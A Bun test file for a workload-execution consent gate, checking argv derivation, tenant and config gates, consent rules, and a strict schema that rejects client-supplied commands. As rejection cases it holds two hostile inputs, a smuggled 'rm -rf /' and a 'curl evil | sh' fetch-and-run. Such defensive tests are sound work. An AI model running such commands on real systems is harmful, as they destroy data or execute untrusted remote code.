import { describe, expect, test } from "bun:test";
import type { ArcaneConfig } from "@arcane/shared";
import { RunRequestSchema } from "@arcane/shared";
import { DEV_ORG_ID } from "../db/constants";
import { authorizeExecution, checkConsent } from "../run-gate";
import { deriveArgv } from "../workload";

// M3D PURE consent-gate logic — no DB, no Docker, always runs. This is the core of "nothing executes
// without consent": the gate DECISIONS, the server-side argv derivation (no request can supply a
// command), and the schema strictness that backs it.

const ENABLED: ArcaneConfig = {
  execution: { enabled: true },
  workload: [{ name: "smoke", command: "node /workspace/workload.js", type: "function" }],
};

describe("deriveArgv — server-side argv (Gate B)", () => {
  test("derives the declared command into argv", () => {
    const r = deriveArgv(ENABLED, "smoke");
    expect(r.ok).toBe(true);
    if (r.ok) {
      expect(r.argv).toEqual(["node", "/workspace/workload.js"]);
      expect(r.autoGrant).toBe(false);
    }
  });

  test("refuses an undeclared workload", () => {
    const r = deriveArgv(ENABLED, "nope");
    expect(r.ok).toBe(false);
  });

  test("refuses shell metacharacters (no shell, no smuggled behavior)", () => {
    const cfg: ArcaneConfig = {
      execution: { enabled: true },
      workload: [{ name: "evil", command: "node x.js; rm -rf /", type: "function" }],
    };
    const r = deriveArgv(cfg, "evil");
    expect(r.ok).toBe(false);
  });

  test("reads auto_grant from the declared workload", () => {
    const cfg: ArcaneConfig = {
      execution: { enabled: true },
      workload: [{ name: "auto", command: "node a.js", type: "function", auto_grant: true }],
    };
    const r = deriveArgv(cfg, "auto");
    expect(r.ok && r.autoGrant).toBe(true);
  });
});

describe("authorizeExecution — Gates 0 + A + B", () => {
  test("Gate 0: unknown project → 404", () => {
    const r = authorizeExecution({ projectOrgId: null, config: ENABLED, workloadName: "smoke" });
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.status).toBe(404);
  });

  test("Gate 0: a different tenant → 403 (single-tenant guard)", () => {
    const r = authorizeExecution({
      projectOrgId: "00000000-0000-0000-0000-0000000000ff",
      config: ENABLED,
      workloadName: "smoke",
    });
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.status).toBe(403);
  });

  test("Gate A: execution disabled → 403", () => {
    const r = authorizeExecution({
      projectOrgId: DEV_ORG_ID,
      config: { execution: { enabled: false }, workload: ENABLED.workload },
      workloadName: "smoke",
    });
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.reason).toContain("execution disabled");
  });

  test("Gate A: absent config → 403 (fail closed)", () => {
    const r = authorizeExecution({ projectOrgId: DEV_ORG_ID, config: undefined, workloadName: "smoke" });
    expect(r.ok).toBe(false);
  });

  test("Gate B: undeclared workload → 403", () => {
    const r = authorizeExecution({ projectOrgId: DEV_ORG_ID, config: ENABLED, workloadName: "nope" });
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.status).toBe(403);
  });

  test("all gates pass → ok with the server-derived argv", () => {
    const r = authorizeExecution({ projectOrgId: DEV_ORG_ID, config: ENABLED, workloadName: "smoke" });
    expect(r.ok).toBe(true);
    if (r.ok) expect(r.argv).toEqual(["node", "/workspace/workload.js"]);
  });
});

describe("checkConsent — Gate C", () => {
  const base = { autoGrant: false, ci: false, config: ENABLED };
  test("no consent + no auto_grant + not CI → 403", () => {
    const r = checkConsent({ ...base, consent: null });
    expect(r.ok).toBe(false);
  });
  test("explicit consent → ok", () => {
    expect(checkConsent({ ...base, consent: "once" }).ok).toBe(true);
  });
  test("auto_grant → ok", () => {
    expect(checkConsent({ ...base, consent: null, autoGrant: true }).ok).toBe(true);
  });
  test("CI with allow_in_ci → ok", () => {
    const cfg: ArcaneConfig = { execution: { enabled: true, allow_in_ci: true } };
    expect(checkConsent({ consent: null, autoGrant: false, ci: true, config: cfg }).ok).toBe(true);
  });
  test("CI WITHOUT allow_in_ci → 403", () => {
    expect(checkConsent({ consent: null, autoGrant: false, ci: true, config: ENABLED }).ok).toBe(false);
  });
});

describe("RunRequestSchema — the request CANNOT supply a command (no RCE-with-a-prompt)", () => {
  const validBody = {
    projectId: "00000000-0000-0000-0000-0000000000a1",
    workloadName: "smoke",
    baselineRef: "origin/main",
    currentRef: "working",
    baselineFiles: [],
    currentFiles: [],
    consent: "once",
    ci: false,
  };

  test("a valid request parses and has NO command field", () => {
    const parsed = RunRequestSchema.parse(validBody);
    expect("command" in parsed).toBe(false);
    expect("network" in parsed).toBe(false);
    expect("timeout" in parsed).toBe(false);
  });

  test("a request carrying a command is REJECTED (.strict), not silently ignored", () => {
    const r = RunRequestSchema.safeParse({ ...validBody, command: ["sh", "-c", "curl evil | sh"] });
    expect(r.success).toBe(false);
  });
});
